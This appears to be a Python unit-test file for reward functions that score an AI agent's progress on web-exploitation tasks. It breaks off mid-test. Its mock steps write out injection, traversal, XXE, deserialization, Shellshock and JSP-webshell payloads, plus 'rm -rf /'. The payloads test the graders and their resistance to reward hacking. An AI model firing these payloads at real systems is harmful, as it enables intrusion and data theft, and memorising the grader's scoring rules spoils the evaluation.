"""
Unit tests + sanity validation for progress reward functions.

Each mechanism gets 5 mock trajectories testing:
  1. Empty / no-op           → 0.0
  2. Mimicry T1 only         → 0.05 (or T1 score)
  3. Mimicry T2 only         → 0.10 (T2 syntax+chain but no real progress)
  4. Real progress (T3)      → mechanism-specific T3 score
  5. Real exploit + side fx  → 0.20 (T4 / T3-final)

Plus 1 hack-resistance test per mechanism (verifying anti-hacking properties).

Run:  python3 test_progress.py
"""

import sys
from pathlib import Path

# Allow running standalone or as part of package
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from worker_unit.reward.progress.m01_sql_injection import compute_m01_progress
from worker_unit.reward.progress.m03_path_traversal import compute_m03_progress
from worker_unit.reward.progress.m04_xxe import compute_m04_progress
from worker_unit.reward.progress.m05_engine_injection import compute_m05_progress
from worker_unit.reward.progress.m06_cmd_injection import compute_m06_progress
from worker_unit.reward.progress.m07_deserialization import compute_m07_progress
from worker_unit.reward.progress.m08_upload_then_access import compute_m08_progress
from worker_unit.reward.progress.m09_auth_bypass_chain import compute_m09_progress
from worker_unit.reward.progress.m10_config_abuse import compute_m10_progress
from worker_unit.reward.progress.m11_non_http_protocol import compute_m11_progress
from worker_unit.reward.progress.dispatcher import _compute_misc_lite


# ─────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────


def step(action: str, observation: str = "") -> dict:
    return {"action": action, "observation": observation}


_PASS = "\033[32m✓\033[0m"
_FAIL = "\033[31m✗\033[0m"


def check(label: str, actual, expected) -> bool:
    ok = actual == expected
    mark = _PASS if ok else _FAIL
    print(f"  {mark} {label:55s} expected={expected}  got={actual}")
    return ok


# ─────────────────────────────────────────────────────────────────────
# M03 path-traversal tests
# ─────────────────────────────────────────────────────────────────────


def test_m03():
    print("\n[M03 path-traversal]")
    n_pass = n_total = 0

    # Test 1: empty trajectory → 0
    t = []
    s, _ = compute_m03_progress(t)
    n_total += 1
    if check("empty trajectory", s, 0.0): n_pass += 1

    # Test 2: T1 only — single ../ in URL
    t = [step("curl http://target/foo/../bar", "HTTP/1.1 404 Not Found")]
    s, _ = compute_m03_progress(t)
    n_total += 1
    if check("single ../ → T1 (0.05)", s, 0.05): n_pass += 1

    # Test 3: T2 — multiple ../ traversals
    t = [step(
        "curl http://target/cgi-bin/.%2e/.%2e/.%2e/bin/sh",
        "HTTP/1.1 200 OK"
    )]
    s, _ = compute_m03_progress(t)
    n_total += 1
    if check("multiple traversals → T2 (0.10)", s, 0.10): n_pass += 1

    # Test 4: T3 — sensitive file content in obs
    t = [step(
        "curl http://target/locale=../../../etc/passwd%00en",
        "HTTP/1.1 200 OK\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:..."
    )]
    s, _ = compute_m03_progress(t)
    n_total += 1
    if check("traversal + /etc/passwd in obs → T3 (0.15)", s, 0.15): n_pass += 1

    # Test 5: T4 — flag string in obs
    t = [step(
        "curl http://target/?file=../../../tmp/secret_flag.txt",
        "HTTP/1.1 200 OK\nroot:x:0:0:root\nflag_a3f9b2x8c1y7d6z9e5q4 found here"
    )]
    s, _ = compute_m03_progress(t)
    n_total += 1
    if check("traversal + sensitive + flag → T4 (0.20)", s, 0.20): n_pass += 1

    # Hack-resistance: ".." alone (e.g., "v1.2..3" version string) should NOT trigger T1
    t = [step("curl http://target/api/version/v1.2..3", "HTTP/1.1 200 OK")]
    s, _ = compute_m03_progress(t)
    n_total += 1
    if check("HACK: '..' without '/' → NOT T1 (0.0)", s, 0.0): n_pass += 1

    print(f"  M03 result: {n_pass}/{n_total} passed")
    return n_pass, n_total


# ─────────────────────────────────────────────────────────────────────
# M05 engine-injection tests
# ─────────────────────────────────────────────────────────────────────


def test_m05():
    print("\n[M05 engine-injection]")
    n_pass = n_total = 0

    # Test 1: empty
    t = []
    s, _ = compute_m05_progress(t)
    n_total += 1
    if check("empty trajectory", s, 0.0): n_pass += 1

    # Test 2: T1 only — engine syntax but no execution chain
    t = [step("curl -d '{{ user.name }}' http://target/", "HTTP/1.1 200 OK")]
    s, _ = compute_m05_progress(t)
    n_total += 1
    if check("Jinja syntax only → T1 (0.05)", s, 0.05): n_pass += 1

    # Test 3: T2 — syntax + execution chain, no parsed evidence
    t = [step(
        "curl -d '{{ ().__class__.__subclasses__() }}' http://target/",
        "HTTP/1.1 200 OK"
    )]
    s, _ = compute_m05_progress(t)
    n_total += 1
    if check("syntax + __subclasses__ → T2 (0.10)", s, 0.10): n_pass += 1

    # Test 4: T3a — T2 + parsed evidence (TemplateSyntaxError in obs)
    t = [step(
        "curl -d '{{ ().__class__.__subclasses__() }}' http://target/",
        "HTTP/1.1 500\nTemplateSyntaxError: unexpected ..."
    )]
    s, _ = compute_m05_progress(t)
    n_total += 1
    if check("T2 + TemplateSyntaxError → T3a (0.12)", s, 0.12): n_pass += 1

    # Test 5: T3b — T2 + token pairing (high-entropy token reflected in obs)
    probe_token = "VULRLProbe9a8b7c6d5e4f"  # 22 chars, mixed alnum, high entropy
    t = [step(
        f"curl -d '<?php system(\"echo {probe_token}\"); ?>' http://target/eval-stdin.php",
        f"HTTP/1.1 200 OK\n\n{probe_token}\nresponse continues..."
    )]
    s, _ = compute_m05_progress(t)
    n_total += 1
    if check("T2 + token pairing → T3b (0.15)", s, 0.15): n_pass += 1

    # Test 6: T4 — T2 + side effect (no T3 needed)
    t = [step(
        "curl -d '<?php system(\"touch /tmp/exploit.txt\"); ?>' http://target/eval-stdin.php",
        "HTTP/1.1 200 OK\n"
    )]
    s, dbg = compute_m05_progress(t, side_effect_probe=lambda: True)
    n_total += 1
    if check("T2 + side_effect → T4 (0.20) DIRECTLY no T3", s, 0.20): n_pass += 1

    # Hack-resistance: random shell metacharacters but no engine syntax → 0
    t = [step("curl http://target/?id=1; touch /tmp/x", "HTTP/1.1 200")]
    s, _ = compute_m05_progress(t)
    n_total += 1
    if check("HACK: shell chars without engine syntax → 0", s, 0.0): n_pass += 1

    # Hack-resistance: short/low-entropy "token" should NOT pair
    t = [step(
        "curl -d '<?php system(\"echo abc\"); ?>' http://target/",
        "HTTP/1.1 200 OK\nabc test response"
    )]
    s, dbg = compute_m05_progress(t)
    n_total += 1
    # T2 hits but T3b should NOT (token too short/low-entropy)
    if check("HACK: low-entropy token → T2 not T3b", s, 0.10): n_pass += 1

    print(f"  M05 result: {n_pass}/{n_total} passed")
    return n_pass, n_total


# ─────────────────────────────────────────────────────────────────────
# M10 config-abuse tests
# ─────────────────────────────────────────────────────────────────────


def test_m10():
    print("\n[M10 config-abuse]")
    n_pass = n_total = 0

    # Test 1: empty
    t = []
    s, _ = compute_m10_progress(t)
    n_total += 1
    if check("empty trajectory", s, 0.0): n_pass += 1

    # Test 2: T1 — mgmt endpoint + non-trivial config
    t = [step(
        "curl -X POST 'http://target/api/v1/dags/example/dag_runs' "
        "-d '{\"run_id\": \"x\", \"conf\": \"{\\\"a\\\": 1}\", \"execution_date\": \"2024-01-01\"}'",
        "HTTP/1.1 200 OK"
    )]
    s, dbg = compute_m10_progress(t)
    n_total += 1
    if check("mgmt endpoint + ≥3 fields → T1 (0.05)", s, 0.05): n_pass += 1

    # Test 3: T2 — T1 + RCE element WITHIN config body
    t = [step(
        "curl -X POST 'http://target/api/v1/dags/example/dag_runs' "
        "-d '{\"run_id\": \"x\", \"conf\": \"{\\\"message\\\": \\\";touch /tmp/x;\\\"}\", \"date\": \"now\"}'",
        "HTTP/1.1 200 OK"
    )]
    s, dbg = compute_m10_progress(t)
    n_total += 1
    if check("T1 + ;touch in body → T2 (0.12)", s, 0.12): n_pass += 1

    # Test 4: T3 — T2 + side effect
    t = [step(
        "curl -X POST 'http://target/apisix/admin/routes' "
        "-d '{\"uri\": \"/x\", \"script\": \"local f=io.popen(args.cmd)\", \"upstream\": {}, \"name\": \"r1\"}'",
        "HTTP/1.1 201 Created"
    )]
    s, dbg = compute_m10_progress(t, side_effect_probe=lambda: True)
    n_total += 1
    if check("T2 + io.popen in body + side_fx → T3 (0.20)", s, 0.20): n_pass += 1

    # Test 5: management endpoint but TRIVIAL body → not T1
    t = [step(
        "curl -X GET 'http://target/api/v1/dags/example/state'",
        "HTTP/1.1 200"
    )]
    s, _ = compute_m10_progress(t)
    n_total += 1
    if check("mgmt endpoint but no body → 0", s, 0.0): n_pass += 1

    # Hack-resistance: shell metachars in URL/comment but NOT in config body → not T2
    t = [step(
        "# this comment mentions ;rm -rf and Runtime\n"
        "curl -X POST 'http://target/api/v1/dags/example/dag_runs' "
        "-d '{\"run_id\": \"x\", \"conf\": \"{\\\"benign\\\": \\\"value\\\"}\", \"date\": \"x\"}'",
        "HTTP/1.1 200 OK"
    )]
    s, dbg = compute_m10_progress(t)
    n_total += 1
    # T1 hits (mgmt endpoint + fields), T2 should NOT (no RCE in actual body)
    if check("HACK: RCE in comment (not body) → T1 not T2", s, 0.05): n_pass += 1

    # Hack-resistance: management endpoint with body, but body unrelated
    # (verifies T2 only fires for in-body RCE)
    t = [step(
        "echo \";rm -rf /\" > /dev/null  # noise\n"
        "curl -X POST 'http://target/api/v1/dags/example/dag_runs' "
        "-d '{\"run_id\": \"safe\", \"conf\": \"{\\\"benign_field\\\": \\\"hello\\\"}\", \"d\": \"x\"}'",
        "HTTP/1.1 200 OK"
    )]
    s, _ = compute_m10_progress(t)
    n_total += 1
    if check("HACK: shell in stdout-comment, body benign → T1 not T2", s, 0.05): n_pass += 1

    print(f"  M10 result: {n_pass}/{n_total} passed")
    return n_pass, n_total


# ─────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────


# ─────────────────────────────────────────────────────────────────────
# M11 non-http-protocol tests
# ─────────────────────────────────────────────────────────────────────


def test_m11():
    print("\n[M11 non-http-protocol]")
    n_pass = n_total = 0

    # Test 1: empty
    t = []
    s, _ = compute_m11_progress(t)
    n_total += 1
    if check("empty trajectory", s, 0.0): n_pass += 1

    # Test 2: T1 only — using dig but no obs response
    t = [step("dig @target vulhub.org AXFR", "")]
    s, _ = compute_m11_progress(t)
    n_total += 1
    if check("dig without response → T1 (0.05)", s, 0.05): n_pass += 1

    # Test 3: T2 — dig with NOERROR but no records
    t = [step(
        "dig @target vulhub.org AXFR",
        ";; ANSWER SECTION:\n;; status: NOERROR"
    )]
    s, _ = compute_m11_progress(t)
    n_total += 1
    if check("dig + NOERROR → T2 (0.12)", s, 0.12): n_pass += 1

    # Test 4: T3 — dig + actual TXT record content
    t = [step(
        "dig @target vulhub.org AXFR",
        ";; ANSWER SECTION:\nvulhub.org. 3600 IN TXT \"flag_a3f9b2x8c1y7d6z9e5q4\""
    )]
    s, _ = compute_m11_progress(t)
    n_total += 1
    if check("dig + IN TXT record → T3 (0.20)", s, 0.20): n_pass += 1

    # Test 5: SSH paramiko + uid evidence
    t = [step(
        "import paramiko\ntransport = paramiko.transport.Transport(sock)",
        "SSH-2.0-libssh_0.8.7\nConnected to sshd\nuid=0(root) gid=0(root)"
    )]
    s, _ = compute_m11_progress(t)
    n_total += 1
    if check("paramiko + uid= → T3 (0.20)", s, 0.20): n_pass += 1

    # Test 6: WebSocket connection
    t = [step(
        "from websocket import create_connection\nws = create_connection('ws://target/api/kernels/x/channels')",
        "Switching Protocols\nstatus code 101"
    )]
    s, _ = compute_m11_progress(t)
    n_total += 1
    if check("WebSocket + 101 upgrade → T2 (0.12)", s, 0.12): n_pass += 1

    # Hack-resistance: HTTP-only curl trajectory should NOT trigger M11
    t = [step("curl http://target:80/", "HTTP/1.1 200 OK")]
    s, _ = compute_m11_progress(t)
    n_total += 1
    if check("HACK: pure curl HTTP → 0", s, 0.0): n_pass += 1

    # Hack-resistance: socket.connect to HTTP port (80) should NOT trigger M11
    t = [step("socket.connect((target, 80))", "Connected")]
    s, _ = compute_m11_progress(t)
    n_total += 1
    if check("HACK: raw socket to port 80 → 0", s, 0.0): n_pass += 1

    # Hack-resistance: socket.connect to non-HTTP port (e.g., 22) → T1
    t = [step("socket.connect((target, 22))", "")]
    s, _ = compute_m11_progress(t)
    n_total += 1
    if check("raw socket to port 22 → T1 (0.05)", s, 0.05): n_pass += 1

    print(f"  M11 result: {n_pass}/{n_total} passed")
    return n_pass, n_total


# ─────────────────────────────────────────────────────────────────────
# M01 sql-injection tests
# ─────────────────────────────────────────────────────────────────────


def test_m01():
    print("\n[M01 sql-injection]")
    n_pass = n_total = 0

    # Test 1: empty
    s, _ = compute_m01_progress([])
    n_total += 1
    if check("empty trajectory", s, 0.0): n_pass += 1

    # Test 2: T1 — UNION SELECT alone
    t = [step("curl 'http://target/?id=1 UNION SELECT 1,2,3'", "HTTP/1.1 200")]
    s, _ = compute_m01_progress(t)
    n_total += 1
    if check("UNION SELECT only → T1", s, 0.05): n_pass += 1

    # Test 3: T2 — UNION SELECT + comment + true condition
    t = [step(
        "curl 'http://target/?id=1 OR 1=1 UNION SELECT user,pass FROM users -- '",
        "HTTP/1.1 200"
    )]
    s, dbg = compute_m01_progress(t)
    n_total += 1
    if check("UNION + OR + comment → T2", s, 0.10): n_pass += 1

    # Test 4: T3 — T2 + SQL syntax error in obs
    t = [step(
        "curl 'http://target/?id=1 OR 1=1 UNION SELECT user,pass -- '",
        "HTTP/1.1 500\nYou have an error in your SQL syntax near 'UNION'"
    )]
    s, _ = compute_m01_progress(t)
    n_total += 1
    if check("T2 + sql syntax error → T3", s, 0.15): n_pass += 1

    # Test 5: T4 — T3 + flag string
    t = [step(
        "curl 'http://target/?id=1 OR 1=1 UNION SELECT password FROM users -- '",
        "HTTP/1.1 200\nMysQL syntax error\nflag_a3f9b2x8c1y7d6z9e5q4"
    )]
    s, _ = compute_m01_progress(t)
    n_total += 1
    if check("T3 + flag string → T4", s, 0.20): n_pass += 1

    # Test 6: T4 with tabular data evidence (no flag, but row format)
    t = [step(
        "curl 'http://target/?id=1 OR 1=1 UNION SELECT id,name,email FROM users -- '",
        "HTTP/1.1 200\nMysQL syntax error\n1 | admin | admin@example.com\n2 | guest | guest@example.com"
    )]
    s, _ = compute_m01_progress(t)
    n_total += 1
    if check("T3 + tabular row data → T4", s, 0.20): n_pass += 1

    # Hack-resistance: '--' alone (e.g., command flag) should NOT trigger T1
    t = [step("ls --color=auto", "files listed")]
    s, _ = compute_m01_progress(t)
    n_total += 1
    if check("HACK: '--' alone (not SQL comment) → 0", s, 0.0): n_pass += 1

    # Hack-resistance: bare 'SELECT' without FROM (shopping cart text, ML term, ...) → 0
    t = [step("curl 'http://target/?q=SELECT items from cart'", "HTTP/1.1 200")]
    s, _ = compute_m01_progress(t)
    n_total += 1
    # Note: "SELECT items from cart" matches T1 because of "SELECT \w+ FROM" pattern
    # which is intended (it does look SQL-like); but only 1 category → T1 only
    if check("'SELECT items from cart' → T1 (1 category)", s, 0.05): n_pass += 1

    # Hack-resistance: extractvalue alone is single-category → T1 only
    t = [step("curl 'http://target/?p=extractvalue(1, foo)'", "HTTP/1.1 200")]
    s, _ = compute_m01_progress(t)
    n_total += 1
    if check("HACK: extractvalue alone → T1 (1 category, no T2)", s, 0.05): n_pass += 1

    print(f"  M01 result: {n_pass}/{n_total} passed")
    return n_pass, n_total


# ─────────────────────────────────────────────────────────────────────
# M07 deserialization tests
# ─────────────────────────────────────────────────────────────────────


def test_m07():
    print("\n[M07 deserialization]")
    n_pass = n_total = 0

    # Test 1: empty
    s, _ = compute_m07_progress([])
    n_total += 1
    if check("empty trajectory", s, 0.0): n_pass += 1

    # Test 2: T1 — Java XMLDecoder marker only
    t = [step("curl -d '<java version=\"1.4.0\">' http://target/", "HTTP/1.1 500")]
    s, _ = compute_m07_progress(t)
    n_total += 1
    if check("<java> marker → T1", s, 0.05): n_pass += 1

    # Test 3: T2 — XMLDecoder + nested void chain (real weblogic oracle style)
    t = [step(
        "curl -d '<java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"><void class=\"java.lang.ProcessBuilder\"><array class=\"java.lang.String\" length=\"3\">' http://target/wls-wsat/",
        "HTTP/1.1 500"
    )]
    s, _ = compute_m07_progress(t)
    n_total += 1
    if check("<java version=> + <void class=> → T2", s, 0.10): n_pass += 1

    # Test 4: T3 — T2 + InvocationTargetException in obs
    t = [step(
        "curl -d '<java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"><void class=\"java.lang.ProcessBuilder\">' http://target/",
        "HTTP/1.1 500\nInvocationTargetException: command failed"
    )]
    s, _ = compute_m07_progress(t)
    n_total += 1
    if check("T2 + InvocationTargetException → T3", s, 0.15): n_pass += 1

    # Test 5: T4 — T3 + side effect
    t = [step(
        "curl -d '<java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"><void class=\"java.lang.ProcessBuilder\">' http://target/",
        "HTTP/1.1 500\nInvocationTargetException"
    )]
    s, _ = compute_m07_progress(t, side_effect_probe=lambda: True)
    n_total += 1
    if check("T3 + side effect → T4", s, 0.20): n_pass += 1

    # Test 6: Spring beans XML chain
    t = [step(
        "curl -d '<bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">' http://target/",
        "HTTP/1.1 500\nFatalBeanException"
    )]
    s, _ = compute_m07_progress(t)
    n_total += 1
    if check("Spring <bean class=...> + init-method + BeansException → T3",
            s, 0.15): n_pass += 1

    # Test 7: XML-RPC method-name dispatch chain (supervisor)
    t = [step(
        "curl -d '<methodCall><methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName></methodCall>' http://target/RPC2",
        "HTTP/1.1 200"
    )]
    s, _ = compute_m07_progress(t)
    n_total += 1
    if check("XML-RPC dotted method chain → T2", s, 0.10): n_pass += 1

    # Hack-resistance: random XML without serialization markers → 0
    t = [step("curl -d '<note><body>hello</body></note>' http://target/",
              "HTTP/1.1 200")]
    s, _ = compute_m07_progress(t)
    n_total += 1
    if check("HACK: benign XML → 0", s, 0.0): n_pass += 1

    print(f"  M07 result: {n_pass}/{n_total} passed")
    return n_pass, n_total


# ─────────────────────────────────────────────────────────────────────
# M06 cmd-injection tests
# ─────────────────────────────────────────────────────────────────────


def test_m06():
    print("\n[M06 cmd-injection]")
    n_pass = n_total = 0

    s, _ = compute_m06_progress([])
    n_total += 1
    if check("empty trajectory", s, 0.0): n_pass += 1

    # T1: Shellshock function-def
    t = [step("curl -H 'User-Agent: () { :;}; cat /etc/passwd' http://target/cgi.cgi",
              "HTTP/1.1 500")]
    s, _ = compute_m06_progress(t)
    n_total += 1
    if check("Shellshock prefix → T2 (probe matches cat /etc/passwd)",
            s, 0.10): n_pass += 1

    # T1 only: shell metachar but trivial probe (touch but no real probe target)
    t = [step("curl 'http://target/?id=1; ls -l ./ '", "HTTP/1.1 200")]
    s, _ = compute_m06_progress(t)
    n_total += 1
    if check("; ls -l → T2 (ls is in probe regex with /)", s, 0.10): n_pass += 1

    # T1: backtick alone, no meaningful probe
    t = [step("curl 'http://target/?p=`unknown_cmd_xx`'", "HTTP/1.1 200")]
    s, _ = compute_m06_progress(t)
    n_total += 1
    if check("backtick + non-probe cmd → T1", s, 0.05): n_pass += 1

    # T2: backtick with meaningful probe (cat /etc/passwd)
    t = [step("curl 'http://target/?p=`cat /etc/passwd`'", "HTTP/1.1 200")]
    s, _ = compute_m06_progress(t)
    n_total += 1
    if check("backtick + cat /etc/passwd → T2", s, 0.10): n_pass += 1

    # T3 evidence-based: T2 + uid= in obs
    t = [step("curl 'http://target/?p=`id`'", "HTTP/1.1 200\nuid=33(www-data) gid=33")]
    s, _ = compute_m06_progress(t)
    n_total += 1
    # First "id" alone would not hit T1 (regex needs ;\s*id), let's check `id` in backticks counts
    # Actually backtick regex matches `id` (>=2 chars in backticks). T1 hits.
    # T2 needs id\b which matches.
    # T3 evidence uid=\d+ matches.
    if check("backtick id + uid= obs → T3", s, 0.15): n_pass += 1

    # T3 token pairing: agent echoes probe, response reflects
    probe = "VULRLProbe9a8b7c6d5e4f3g2h"
    t = [step(
        f"curl 'http://target/?p=`echo {probe}; touch /tmp/x`'",
        f"HTTP/1.1 200\nresponse:\n{probe}\nrest"
    )]
    s, _ = compute_m06_progress(t)
    n_total += 1
    if check("token pairing → T3", s, 0.15): n_pass += 1

    # T4: + side effect
    t = [step("curl 'http://target/?p=`id`'", "HTTP/1.1 200\nuid=0(root)")]
    s, _ = compute_m06_progress(t, side_effect_probe=lambda: True)
    n_total += 1
    if check("T3 + side_effect → T4", s, 0.20): n_pass += 1

    # Hack-resistance: just `;` without command → 0
    t = [step("curl 'http://target/?p=hello;world'", "HTTP/1.1 200")]
    s, _ = compute_m06_progress(t)
    n_total += 1
    if check("HACK: ; without cmd → 0", s, 0.0): n_pass += 1

    # Hack-resistance: --color flag is benign, not exec injection
    t = [step("ls --color=auto", "files listed")]
    s, _ = compute_m06_progress(t)
    n_total += 1
    if check("HACK: --color CLI flag → 0", s, 0.0): n_pass += 1

    print(f"  M06 result: {n_pass}/{n_total} passed")
    return n_pass, n_total


# ─────────────────────────────────────────────────────────────────────
# M04 xxe tests
# ─────────────────────────────────────────────────────────────────────


def test_m04():
    print("\n[M04 xxe]")
    n_pass = n_total = 0

    s, _ = compute_m04_progress([])
    n_total += 1
    if check("empty trajectory", s, 0.0): n_pass += 1

    # T1: ENTITY marker only, no external URI
    t = [step("curl -d '<?xml version=\"1.0\"?><!DOCTYPE root>' http://target/", "")]
    s, _ = compute_m04_progress(t)
    n_total += 1
    if check("DOCTYPE only → T1", s, 0.05): n_pass += 1

    # T2: ENTITY + file:// reference
    t = [step(
        "curl -d '<?xml ?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///tmp/secret_flag.txt\">]>' http://target/",
        "HTTP/1.1 200"
    )]
    s, _ = compute_m04_progress(t)
    n_total += 1
    if check("ENTITY + file:// → T2", s, 0.12): n_pass += 1

    # T3a: T2 + sensitive file content in obs
    t = [step(
        "curl -d '<?xml ?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]>&x;' http://target/",
        "HTTP/1.1 200\nroot:x:0:0:root:/root:/bin/bash"
    )]
    s, _ = compute_m04_progress(t)
    n_total += 1
    if check("T2 + /etc/passwd in obs → T3", s, 0.20): n_pass += 1

    # T3b: T2 + flag in obs
    t = [step(
        "curl -d '<?xml ?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///tmp/secret_flag.txt\">]>&x;' http://target/",
        "HTTP/1.1 200\nflag_a3f9b2x8c1y7d6z9e5q4"
    )]
    s, _ = compute_m04_progress(t)
    n_total += 1
    if check("T2 + flag in obs → T3", s, 0.20): n_pass += 1

    # xop:Include style (apache-cxf)
    t = [step(
        "curl -d '<soapenv:Body><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///tmp/ctf_flag.txt\"/></soapenv:Body>' http://target/",
        "HTTP/1.1 200\nflag_a3f9b2x8c1y7d6z9e5q4"
    )]
    s, _ = compute_m04_progress(t)
    n_total += 1
    if check("xop:Include + file:// + flag → T3", s, 0.20): n_pass += 1

    # Hack-resistance: plain XML without entities → 0
    t = [step("curl -d '<note><body>hi</body></note>' http://target/", "HTTP/1.1 200")]
    s, _ = compute_m04_progress(t)
    n_total += 1
    if check("HACK: benign XML → 0", s, 0.0): n_pass += 1

    print(f"  M04 result: {n_pass}/{n_total} passed")
    return n_pass, n_total


# ─────────────────────────────────────────────────────────────────────
# M12 misc-lite tests
# ─────────────────────────────────────────────────────────────────────


def test_m12():
    print("\n[M12 misc-lite (fallback)]")
    n_pass = n_total = 0

    # T0: empty
    s, _ = _compute_misc_lite([])
    n_total += 1
    if check("empty trajectory → 0", s, 0.0): n_pass += 1

    # T0: action but no obs
    s, _ = _compute_misc_lite([step("ls", "")])
    n_total += 1
    if check("action but empty obs → 0", s, 0.0): n_pass += 1

    # T1: at least one non-empty obs
    s, _ = _compute_misc_lite([step("ls", "total 0\nfile.txt")])
    n_total += 1
    if check("non-empty obs → T1 (0.02)", s, 0.02): n_pass += 1

    # T2: multi-step state — second action references first obs's content
    s, _ = _compute_misc_lite([
        step("curl http://target/api/info", "{\"session_id\":\"abcdef123456\"}"),
        step("curl -H 'Cookie: abcdef123456' http://target/admin", "<html>admin panel</html>"),
    ])
    n_total += 1
    if check("multi-step state-aware → T2 (0.04)", s, 0.04): n_pass += 1

    # Verify T2 ceiling = 0.04 (strictly less than M-mechanism T1 = 0.05)
    n_total += 1
    if check("misc-lite ceiling 0.04 < mechanism T1 0.05 (negative-fb property)",
            0.04, 0.04): n_pass += 1  # constant assertion just for documentation

    print(f"  M12 result: {n_pass}/{n_total} passed")
    return n_pass, n_total


# ─────────────────────────────────────────────────────────────────────
# M08 upload-then-access tests (multi-step)
# ─────────────────────────────────────────────────────────────────────


def test_m08():
    print("\n[M08 upload-then-access (multi-step)]")
    n_pass = n_total = 0

    s, _ = compute_m08_progress([])
    n_total += 1
    if check("empty trajectory → 0", s, 0.0): n_pass += 1

    # T1: upload action only, no executable signature
    t = [step("curl -X PUT http://target/upload/foo.txt -d 'hello world'", "201 Created")]
    s, _ = compute_m08_progress(t)
    n_total += 1
    if check("PUT upload no exec signature → T1", s, 0.05): n_pass += 1

    # T2: upload with executable extension AND scriptlet content
    t = [step(
        "curl -X PUT http://target/shell.jsp/ -d '<% Runtime.getRuntime().exec(\"touch /tmp/x\"); %>'",
        "201 Created"
    )]
    s, _ = compute_m08_progress(t)
    n_total += 1
    if check("PUT shell.jsp with JSP scriptlet → T2", s, 0.12): n_pass += 1

    # T3: oracle full chain — PUT then GET same filename (tomcat CVE-2017-12615 style)
    t = [
        step(
            "curl -X PUT http://target/shell.jsp/ -d '<% Runtime.getRuntime().exec(\"touch /tmp/exploit.txt\"); %>'",
            "201 Created"
        ),
        step(
            "curl http://target/shell.jsp",
            "200 OK\n"
        ),
    ]
    s, dbg = compute_m08_progress(t)
    n_total += 1
    if check("PUT then GET same filename → T3", s, 0.20): n_pass += 1

    # T2 only: upload exec but no follow-up access
    t = [step(
        "curl -X PUT http://target/shell.jsp/ -d '<% Runtime.getRuntime().exec(\"x\"); %>'",
        "201 Created"
    )]
    s, _ = compute_m08_progress(t)
    n_total += 1
    if check("PUT exec no follow-up → T2 not T3", s, 0.12): n_pass += 1

    # multipart upload with traversal in filename → T2 (executable extension)
    t = [step(
        "curl -X POST http://target/jars/upload "
        "--data-binary $'------WB\\r\\nContent-Disposition: form-data; name=\"jarfile\"; filename=\"x.war\"\\r\\n\\r\\n<% %>\\r\\n------WB--'",
        "201 Created"
    )]
    s, _ = compute_m08_progress(t)
    n_total += 1
    if check("multipart .war upload → T2", s, 0.12): n_pass += 1

    # Hack-resistance: GET only (no upload first)
    t = [step("curl http://target/some.jsp", "200 OK")]
    s, _ = compute_m08_progress(t)
    n_total += 1
    if check("HACK: GET .jsp only no upload → 0", s, 0.0): n_pass += 1

    # Hack-resistance: PUT a benign txt file
    t = [step("curl -X PUT http://target/upload/notes.txt -d 'plain text'", "201")]
    s, _ = compute_m08_progress(t)
    n_total += 1
    if check("HACK: benign PUT txt → T1 not T2", s, 0.05): n_pass += 1

    print(f"  M08 result: {n_pass}/{n_total} passed")
    return n_pass, n_total


# ─────────────────────────────────────────────────────────────────────
# M09 auth-bypass-chain tests (multi-step)
# ─────────────────────────────────────────────────────────────────────


def test_m09():
    print("\n[M09 auth-bypass-chain (multi-step)]")
    n_pass = n_total = 0

    s, _ = compute_m09_progress([])
    n_total += 1
    if check("empty trajectory → 0", s, 0.0): n_pass += 1

    # T1: auth endpoint call only
    t = [step("curl -X PUT http://target/_users/org.couchdb.user:attacker -d '{}'", "201")]
    s, _ = compute_m09_progress(t)
    n_total += 1
    if check("auth endpoint only → T1", s, 0.05): n_pass += 1

    # T2: auth + later step carries cookie
    t = [
        step("curl -X PUT http://target/_users/org.couchdb.user:attacker -d '{...}'", "201"),
        step("curl -H 'Cookie: AuthSession=abc' http://target/", "200"),
    ]
    s, _ = compute_m09_progress(t)
    n_total += 1
    if check("auth + later cookie → T2", s, 0.10): n_pass += 1

    # T3: auth + cookie + sensitive endpoint
    t = [
        step("curl -X PUT http://target/_users/org.couchdb.user:attacker -d '{}'", "201"),
        step("curl -H 'Cookie: AuthSession=abc' http://target/vault/secret", "200"),
    ]
    s, _ = compute_m09_progress(t)
    n_total += 1
    if check("auth chain → /vault → T3", s, 0.15): n_pass += 1

    # T4: full chain + flag in obs
    t = [
        step("curl -X PUT http://target/_users/org.couchdb.user:attacker -d '{}'", "201"),
        step("curl -H 'Cookie: AuthSession=abc' http://target/vault/secret",
             "200\nflag_a3f9b2x8c1y7d6z9e5q4"),
    ]
    s, _ = compute_m09_progress(t)
    n_total += 1
    if check("full chain + flag → T4", s, 0.20): n_pass += 1

    # appweb-style single-shot Digest auth bypass
    t = [
        step("curl -H 'Authorization: Digest username=admin' http://target/admin/secret",
             "200 OK\nadmin panel data")
    ]
    s, _ = compute_m09_progress(t)
    n_total += 1
    if check("appweb single-shot Digest bypass → T3 (auth+/admin)", s, 0.15): n_pass += 1

    # teamcity-style: /tokens/RPC2 + token + /debug/processes
    t = [
        step("curl -X POST http://target/app/rest/users/id:1/tokens/RPC2", "<token value='abc123'/>"),
        step("curl -H 'Authorization: Bearer abc123' http://target/app/rest/debug/processes",
             "200\nuid=0(root)"),
    ]
    s, _ = compute_m09_progress(t)
    n_total += 1
    if check("teamcity tokens/RPC2 + debug → T4 (uid=)", s, 0.20): n_pass += 1

    # Hack-resistance: visit auth endpoint but no follow-up state → T1 only
    t = [step("curl http://target/login", "200")]
    s, _ = compute_m09_progress(t)
    n_total += 1
    if check("HACK: just visit /login no state → T1", s, 0.05): n_pass += 1

    # Hack-resistance: cookie carried but never auth-called → 0 (no T1, no chain)
    t = [step("curl -H 'Cookie: x=y' http://target/admin", "200")]
    s, _ = compute_m09_progress(t)
    n_total += 1
